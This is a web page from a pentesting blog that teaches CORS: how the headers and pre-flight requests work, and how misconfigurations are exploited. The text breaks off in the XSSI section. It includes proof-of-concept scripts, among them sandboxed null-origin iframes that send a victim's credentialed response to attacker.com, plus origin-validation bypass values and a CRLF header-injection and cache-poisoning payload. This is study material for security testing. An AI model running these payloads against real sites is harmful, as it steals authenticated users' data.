<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> CORS - Misconfigurations &amp; Bypass | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%9B%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/projects/pentesting-web/2025-01-01-cors-bypass/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">h0m3 </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item active"> <a class="nav-link" href="/projects/">projects <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repositories </a> </li> <li class="nav-item "> <a class="nav-link" href="/cv/">cv </a> </li> <li class="nav-item "> <a class="nav-link" href="/teaching/">teaching </a> </li> <li class="nav-item "> <a class="nav-link" href="/people/">people </a> </li> <li class="nav-item "> <a class="nav-link" href="/hacking/">hacking </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <a class="dropdown-item " href="/publications/">publications</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/projects/">projects</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/blog/">blog</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">CORS - Misconfigurations &amp; Bypass</h1> <p class="post-description"></p> </header> <article> <h1 id="cors---misconfigurations--bypass">CORS - Misconfigurations &amp; Bypass</h1> <h2 id="what-is-cors">What is CORS?</h2> <p>Cross-Origin Resource Sharing (CORS) standard <strong>enables servers to define who can access their assets</strong> and <strong>which HTTP request methods are permitted</strong> from external sources.</p> <p>A <strong>same-origin</strong> policy mandates that a <strong>server requesting</strong> a resource and the server hosting the <strong>resource</strong> share the same protocol (e.g., <code class="language-plaintext highlighter-rouge">http://</code>), domain name (e.g., <code class="language-plaintext highlighter-rouge">internal-web.com</code>), and <strong>port</strong> (e.g., 80). Under this policy, only web pages from the same domain and port are allowed access to the resources.</p> <p>The application of the same-origin policy in the context of <code class="language-plaintext highlighter-rouge">http://normal-website.com/example/example.html</code> is illustrated as follows:</p> <table> <thead> <tr> <th>URL accessed</th> <th>Access permitted?</th> </tr> </thead> <tbody> <tr> <td><code class="language-plaintext highlighter-rouge">http://normal-website.com/example/</code></td> <td>Yes: Identical scheme, domain, and port</td> </tr> <tr> <td><code class="language-plaintext highlighter-rouge">http://normal-website.com/example2/</code></td> <td>Yes: Identical scheme, domain, and port</td> </tr> <tr> <td><code class="language-plaintext highlighter-rouge">https://normal-website.com/example/</code></td> <td>No: Different scheme and port</td> </tr> <tr> <td><code class="language-plaintext highlighter-rouge">http://en.normal-website.com/example/</code></td> <td>No: Different domain</td> </tr> <tr> <td><code class="language-plaintext highlighter-rouge">http://www.normal-website.com/example/</code></td> <td>No: Different domain</td> </tr> <tr> <td><code class="language-plaintext highlighter-rouge">http://normal-website.com:8080/example/</code></td> <td>No: Different port*</td> </tr> </tbody> </table> <p>*Internet Explorer disregards the port number in enforcing the same-origin policy, thus allowing this access.</p> <h3 id="access-control-allow-origin-header"> <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin</code> Header</h3> <p>This header can allow <strong>multiple origins</strong>, a <strong><code class="language-plaintext highlighter-rouge">null</code></strong> value, or a wildcard <strong><code class="language-plaintext highlighter-rouge">*</code></strong>. However, <strong>no browser supports multiple origins</strong>, and the use of the wildcard <code class="language-plaintext highlighter-rouge">*</code> is subject to <strong>limitations</strong>. (The wildcard must be used alone, and its use alongside <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Credentials: true</code> is not permitted.)</p> <p>This header is <strong>issued by a server</strong> in response to a cross-domain resource request initiated by a website, with the browser automatically adding an <code class="language-plaintext highlighter-rouge">Origin</code> header.</p> <h3 id="access-control-allow-credentials-header"> <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Credentials</code> Header</h3> <p>By <strong>default</strong>, cross-origin requests are made without credentials like cookies or the Authorization header. Yet, a cross-domain server can allow the reading of the response when credentials are sent by setting the <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Credentials</code> header to <strong><code class="language-plaintext highlighter-rouge">true</code></strong>.</p> <p>If set to <code class="language-plaintext highlighter-rouge">true</code>, the browser will transmit credentials (cookies, authorization headers, or TLS client certificates).</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
  <span class="k">if </span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">===</span> <span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">DONE</span> <span class="o">&amp;&amp;</span> <span class="nx">xhr</span><span class="p">.</span><span class="nx">status</span> <span class="o">===</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">};</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://example.com/</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
</code></pre></div></div> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="p">{</span>
  <span class="na">credentials</span><span class="p">:</span> <span class="dl">"</span><span class="s2">include</span><span class="dl">"</span><span class="p">,</span>
<span class="p">});</span>
</code></pre></div></div> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">https://bar.other/resources/post-here/</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">X-PINGOTHER</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">pingpong</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/xml</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="nx">handler</span><span class="p">;</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;person&gt;&lt;name&gt;Arun&lt;/name&gt;&lt;/person&gt;</span><span class="dl">"</span><span class="p">);</span>
</code></pre></div></div> <h3 id="csrf-pre-flight-request">CSRF Pre-flight request</h3> <h3 id="understanding-pre-flight-requests-in-cross-domain-communication">Understanding Pre-flight Requests in Cross-Domain Communication</h3> <p>When initiating a cross-domain request under specific conditions, such as using a <strong>non-standard HTTP method</strong> (anything other than HEAD, GET, POST), introducing new <strong>headers</strong>, or employing a special <strong>Content-Type header value</strong>, a pre-flight request may be required. This preliminary request, leveraging the <strong><code class="language-plaintext highlighter-rouge">OPTIONS</code></strong> method, serves to inform the server of the forthcoming cross-origin request’s intentions, including the HTTP methods and headers it intends to use.</p> <p>The <strong>Cross-Origin Resource Sharing (CORS)</strong> protocol mandates this pre-flight check to determine the feasibility of the requested cross-origin operation by verifying the allowed methods, headers, and the trustworthiness of the origin. For a detailed understanding of what conditions circumvent the need for a pre-flight request, refer to the comprehensive guide provided by <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests" rel="external nofollow noopener" target="_blank"><strong>Mozilla Developer Network (MDN)</strong></a>.</p> <p>It’s crucial to note that the <strong>absence of a pre-flight request does not negate the requirement for the response to carry authorization headers</strong>. Without these headers, the browser is incapacitated in its ability to process the response from the cross-origin request.</p> <p>Consider the following illustration of a pre-flight request aimed at employing the <code class="language-plaintext highlighter-rouge">PUT</code> method along with a custom header named <code class="language-plaintext highlighter-rouge">Special-Request-Header</code>:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
</code></pre></div></div> <p>In response, the server might return headers indicating the accepted methods, the allowed origin, and other CORS policy details, as shown below:</p> <div class="language-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
</code></pre></div></div> <ul> <li> <strong><code class="language-plaintext highlighter-rouge">Access-Control-Allow-Headers</code></strong>: This header specifies which headers can be used during the actual request. It is set by the server to indicate the allowed headers in requests from the client.</li> <li> <strong><code class="language-plaintext highlighter-rouge">Access-Control-Expose-Headers</code></strong>: Through this header, the server informs the client about which headers can be exposed as part of the response besides the simple response headers.</li> <li> <strong><code class="language-plaintext highlighter-rouge">Access-Control-Max-Age</code></strong>: This header indicates how long the results of a pre-flight request can be cached. The server sets the maximum time, in seconds, that the information returned by a pre-flight request may be reused.</li> <li> <strong><code class="language-plaintext highlighter-rouge">Access-Control-Request-Headers</code></strong>: Used in pre-flight requests, this header is set by the client to inform the server about which HTTP headers the client wants to use in the actual request.</li> <li> <strong><code class="language-plaintext highlighter-rouge">Access-Control-Request-Method</code></strong>: This header, also used in pre-flight requests, is set by the client to indicate which HTTP method will be used in the actual request.</li> <li> <strong><code class="language-plaintext highlighter-rouge">Origin</code></strong>: This header is automatically set by the browser and indicates the origin of the cross-origin request. It is used by the server to assess whether the incoming request should be allowed or denied based on the CORS policy.</li> </ul> <p>Note that usually (depending on the content-type and headers set) in a <strong>GET/POST request no pre-flight request is sent</strong> (the request is sent <strong>directly</strong>), but if you want to access the <strong>headers/body of the response</strong>, it must contains an <em>Access-Control-Allow-Origin</em> header allowing it.<br> <strong>Therefore, CORS doesn’t protect against CSRF (but it can be helpful).</strong></p> <h3 id="local-network-requests-pre-flight-request"><strong>Local Network Requests Pre-flight request</strong></h3> <ol> <li> <strong><code class="language-plaintext highlighter-rouge">Access-Control-Request-Local-Network</code></strong>: This header is included in the client’s request to signify that the inquiry is aimed at a local network resource. It serves as a marker to inform the server that the request originates from within the local network.</li> <li> <strong><code class="language-plaintext highlighter-rouge">Access-Control-Allow-Local-Network</code></strong>: In response, servers utilize this header to communicate that the requested resource is permitted to be shared with entities outside of the local network. It acts as a green light for sharing resources across different network boundaries, ensuring controlled access while maintaining security protocols.</li> </ol> <p>A <strong>valid response allowing the local network request</strong> needs to have also in the response the header <code class="language-plaintext highlighter-rouge">Access-Controls-Allow-Local_network: true</code> :</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
</code></pre></div></div> <blockquote> <p>[!WARNING] Note that the linux <strong>0.0.0.0</strong> IP works to <strong>bypass</strong> these requirements to access localhost as that IP address is not considered “local”.</p> <p>It’s also possible to <strong>bypass the Local Network requirements</strong> if you use the <strong>public IP address of a local endpoint</strong> (like the public IP of the router). Because in several occasions, even if the <strong>public IP</strong> is being accessed, if it’s <strong>from the local network</strong>, access will be granted.</p> </blockquote> <h3 id="wildcards">Wildcards</h3> <p>Note that even if the following configuration might look super permissive:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Access-Control-Allow-Origin: <span class="k">*</span>
Access-Control-Allow-Credentials: <span class="nb">true</span>
</code></pre></div></div> <p>This is not allowed by browsers and therefore credentials won’t be sent with the request allowed by this.</p> <h2 id="exploitable-misconfigurations">Exploitable misconfigurations</h2> <p>It has been observed that the setting of <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Credentials</code> to <strong><code class="language-plaintext highlighter-rouge">true</code></strong> is a prerequisite for most <strong>real attacks</strong>. This setting permits the browser to send credentials and read the response, enhancing the attack’s effectiveness. Without this, the benefit of making a browser issue a request over doing it oneself diminishes, as leveraging a user’s cookies becomes unfeasible.</p> <h3 id="exception-exploiting-network-location-as-authentication">Exception: Exploiting Network Location as Authentication</h3> <p>An exception exists where the victim’s network location acts as a form of authentication. This allows for the victim’s browser to be used as a proxy, circumventing IP-based authentication to access intranet applications. This method shares similarities in impact with DNS rebinding but is simpler to exploit.</p> <h3 id="reflection-of-origin-in-access-control-allow-origin">Reflection of <code class="language-plaintext highlighter-rouge">Origin</code> in <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin</code> </h3> <p>The real-world scenario where the <code class="language-plaintext highlighter-rouge">Origin</code> header’s value is reflected in <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin</code> is theoretically improbable due to restrictions on combining these headers. However, developers seeking to enable CORS for multiple URLs may dynamically generate the <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin</code> header by copying the <code class="language-plaintext highlighter-rouge">Origin</code> header’s value. This approach can introduce vulnerabilities, particularly when an attacker employs a domain with a name designed to appear legitimate, thereby deceiving the validation logic.</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
  <span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
  <span class="nx">req</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nx">reqListener</span><span class="p">;</span>
  <span class="nx">req</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">get</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">https://example.com/details</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
  <span class="nx">req</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
  <span class="nx">req</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
  <span class="kd">function</span> <span class="nf">reqListener</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">location</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">/log?key=</span><span class="dl">"</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
  <span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div> <h3 id="exploiting-the-null-origin">Exploiting the <code class="language-plaintext highlighter-rouge">null</code> Origin</h3> <p>The <code class="language-plaintext highlighter-rouge">null</code> origin, specified for situations like redirects or local HTML files, holds a unique position. Some applications whitelist this origin to facilitate local development, inadvertently allowing any website to mimic a <code class="language-plaintext highlighter-rouge">null</code> origin through a sandboxed iframe, thus bypassing CORS restrictions.</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span>
  <span class="na">sandbox=</span><span class="s">"allow-scripts allow-top-navigation allow-forms"</span>
  <span class="na">src=</span><span class="s">"data:text/html,&lt;script&gt;
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://example/details',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
  };
&lt;/script&gt;"</span>
<span class="nt">&gt;&lt;/iframe&gt;</span>
</code></pre></div></div> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span>
  <span class="na">sandbox=</span><span class="s">"allow-scripts allow-top-navigation allow-forms"</span>
  <span class="na">srcdoc=</span><span class="s">"&lt;script&gt;
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://example/details',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
  };
&lt;/script&gt;"</span>
<span class="nt">&gt;&lt;/iframe&gt;</span>
</code></pre></div></div> <h3 id="regular-expression-bypass-techniques">Regular Expression Bypass Techniques</h3> <p>When encountering a domain whitelist, it’s crucial to test for bypass opportunities, such as appending the attacker’s domain to a whitelisted domain or exploiting subdomain takeover vulnerabilities. Additionally, regular expressions used for domain validation may overlook nuances in domain naming conventions, presenting further bypass opportunities.</p> <h3 id="advanced-regular-expression-bypasses">Advanced Regular Expression Bypasses</h3> <p>Regex patterns typically concentrate on alphanumeric, dot (.), and hyphen (-) characters, neglecting other possibilities. For example, a domain name crafted to include characters interpreted differently by browsers and regex patterns can bypass security checks. Safari, Chrome, and Firefox’s handling of underscore characters in subdomains illustrates how such discrepancies can be exploited to circumvent domain validation logic.</p> <p><strong>For more information and settings of this bypass check:</strong> <a href="https://www.corben.io/advanced-cors-techniques/" rel="external nofollow noopener" target="_blank"><strong>https://www.corben.io/advanced-cors-techniques/</strong></a> <strong>and</strong> <a href="https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397" rel="external nofollow noopener" target="_blank"><strong>https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397</strong></a></p> <p><img src="../images/image%20(284).png" alt="https://miro.medium.com/v2/resize:fit:720/format:webp/1*rolEK39-DDxeBgSq6KLKAA.png"></p> <h3 id="from-xss-inside-a-subdomain">From XSS inside a subdomain</h3> <p>Developers often implement defensive mechanisms to protect against CORS exploitation by whitelisting domains that are permitted to request information. Despite these precautions, the system’s security is not foolproof. The presence of even a single vulnerable subdomain within the whitelisted domains can open the door to CORS exploitation through other vulnerabilities, such as XSS (Cross-Site Scripting).</p> <p>To illustrate, consider the scenario where a domain, <code class="language-plaintext highlighter-rouge">requester.com</code>, is whitelisted to access resources from another domain, <code class="language-plaintext highlighter-rouge">provider.com</code>. The server-side configuration might look something like this:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if </span><span class="p">(</span><span class="nx">$_SERVER</span><span class="p">[</span><span class="dl">"</span><span class="s2">HTTP_HOST</span><span class="dl">"</span><span class="p">]</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">*.requester.com</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// Access data</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="c1">// Unauthorized access</span>
<span class="p">}</span>
</code></pre></div></div> <p>In this setup, all subdomains of <code class="language-plaintext highlighter-rouge">requester.com</code> are allowed access. However, if a subdomain, say <code class="language-plaintext highlighter-rouge">sub.requester.com</code>, is compromised with an XSS vulnerability, an attacker can leverage this weakness. For example, an attacker with access to <code class="language-plaintext highlighter-rouge">sub.requester.com</code> could exploit the XSS vulnerability to bypass CORS policies and maliciously access resources on <code class="language-plaintext highlighter-rouge">provider.com</code>.</p> <h3 id="special-characters"><strong>Special Characters</strong></h3> <p>PortSwigger’s <a href="https://portswigger.net/research/introducing-the-url-validation-bypass-cheat-sheet" rel="external nofollow noopener" target="_blank">URL validation bypass cheat sheet</a> found that some browsers support strange characters within domain names.</p> <p>Chrome and Firefox support underscores <code class="language-plaintext highlighter-rouge">_</code> that can bypass regexes implemented to validate the <code class="language-plaintext highlighter-rouge">Origin</code> header:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/2
Cookie: &lt;session_cookie&gt;
Origin: https://target.application_.arbitrary.com
</code></pre></div></div> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/2 200 OK
Access-Control-Allow-Origin: https://target.application_.arbitrary.com
Access-Control-Allow-Credentials: true
</code></pre></div></div> <p>Safari is even more lax accepting special characters in the domain name:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/2
Cookie: &lt;session_cookie&gt;
Origin: https://target.application}.arbitrary.com
</code></pre></div></div> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/2 200 OK
Cookie: &lt;session_cookie&gt;
Access-Control-Allow-Origin: https://target.application}.arbitrary.com
Access-Control-Allow-Credentials: true
</code></pre></div></div> <h3 id="other-funny-url-tricks"><strong>Other funny URL tricks</strong></h3> <p>ssrf-server-side-request-forgery/url-format-bypass.md</p> <h3 id="server-side-cache-poisoning"><strong>Server-side cache poisoning</strong></h3> <p><a href="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties" rel="external nofollow noopener" target="_blank"><strong>From this research</strong></a></p> <p>It’s possible that by exploiting server-side cache poisoning through HTTP header injection, a stored Cross-Site Scripting (XSS) vulnerability can be induced. This scenario unfolds when an application fails to sanitize the <code class="language-plaintext highlighter-rouge">Origin</code> header for illegal characters, creating a vulnerability particularly for Internet Explorer and Edge users. These browsers treat (0x0d) as a legitimate HTTP header terminator, leading to HTTP header injection vulnerabilities.</p> <p>Consider the following request where the <code class="language-plaintext highlighter-rouge">Origin</code> header is manipulated:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
</code></pre></div></div> <p>Internet Explorer and Edge interpret the response as:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
</code></pre></div></div> <p>While directly exploiting this vulnerability by making a web browser send a malformed header is not feasible, a crafted request can be manually generated using tools like Burp Suite. This method could lead to a server-side cache saving the response and inadvertently serving it to others. The crafted payload aims to alter the page’s character set to UTF-7, a character encoding often associated with XSS vulnerabilities due to its ability to encode characters in a way that can be executed as script in certain contexts.</p> <p>For further reading on stored XSS vulnerabilities, see <a href="https://portswigger.net/web-security/cross-site-scripting/stored" rel="external nofollow noopener" target="_blank">PortSwigger</a>.</p> <p><strong>Note</strong>: The exploitation of HTTP header injection vulnerabilities, particularly through server-side cache poisoning, underscores the critical importance of validating and sanitizing all user-supplied input, including HTTP headers. Always employ a robust security model that includes input validation to prevent such vulnerabilities.</p> <h3 id="client-side-cache-poisoning"><strong>Client-Side cache poisoning</strong></h3> <p><a href="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties" rel="external nofollow noopener" target="_blank"><strong>From this research</strong></a></p> <p>In this scenario, an instance of a web page reflecting the contents of a custom HTTP header without proper encoding is observed. Specifically, the web page reflects back the contents included in a <code class="language-plaintext highlighter-rouge">X-User-id</code> header, which could include malicious JavaScript, as demonstrated by the example where the header contains an SVG image tag designed to execute JavaScript code on load.</p> <p>Cross-Origin Resource Sharing (CORS) policies allow for the sending of custom headers. However, without the response being directly rendered by the browser due to CORS restrictions, the utility of such an injection might seem limited. The critical point arises when considering the browser’s cache behavior. If the <code class="language-plaintext highlighter-rouge">Vary: Origin</code> header is not specified, it becomes possible for the malicious response to be cached by the browser. Subsequently, this cached response could be rendered directly when navigating to the URL, bypassing the need for direct rendering upon the initial request. This mechanism enhances the reliability of the attack by leveraging client-side caching.</p> <p>To illustrate this attack, a JavaScript example is provided, designed to be executed in the environment of a web page, such as through a JSFiddle. This script performs a simple action: it sends a request to a specified URL with a custom header containing the malicious JavaScript. Upon successful request completion, it attempts to navigate to the target URL, potentially triggering the execution of the injected script if the response has been cached without proper handling of the <code class="language-plaintext highlighter-rouge">Vary: Origin</code> header.</p> <p>Here’s a summarized breakdown of the JavaScript used to execute this attack:</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
  <span class="kd">function</span> <span class="nf">gotcha</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">location</span> <span class="o">=</span> <span class="nx">url</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
  <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://example.com/</span><span class="dl">"</span><span class="p">;</span> <span class="c1">// Note: Be cautious of mixed content blocking for HTTP sites</span>
  <span class="nx">req</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nx">gotcha</span><span class="p">;</span>
  <span class="nx">req</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">get</span><span class="dl">"</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
  <span class="nx">req</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">X-Custom-Header</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">&lt;svg/onload=alert(1)&gt;</span><span class="dl">"</span><span class="p">);</span>
  <span class="nx">req</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div> <h2 id="bypass">Bypass</h2> <h3 id="xssi-cross-site-script-inclusion--jsonp">XSSI (Cross-Site Script Inclusion) / JSONP</h3> <p>XSSI, also known as Cross-Site Script Inclusion, is a type of vulnerability that takes advantage of the fact that the Same Origin Policy (SOP) does not apply when including resources using the script tag. This is because scripts need to be able to be included from different domains. This vulnerability allows an attacker to access and read any content that was included using the script tag.</p> <p>This vulnerability becomes particularly significant when it comes to dynamic JavaScript or JSONP (JSON with Padding), especially when ambient-authority information like cookies are used for authentication. When requesting a resource from a different host, the cookies are included, making them accessible to the attacker.</p> <p>To better understand and mitigate this vulnerability, you can use the BurpSuite plugin available at <a href="https://github.com/kapytein/jsonp" rel="external nofollow noopener" target="_blank">https://github.com/kapytein/jsonp</a>. This plugin can help identify and address potential XSSI vulnerabilities in your web applications.</p> <p><a href="xssi-cross-site-script-inclusion.md"><strong>Read more about the difefrent types of XSSI and how to exploit them here.</strong></a></p> <p>Try to add a <strong><code class="language-plaintext highlighter-rouge">callback</code></strong> 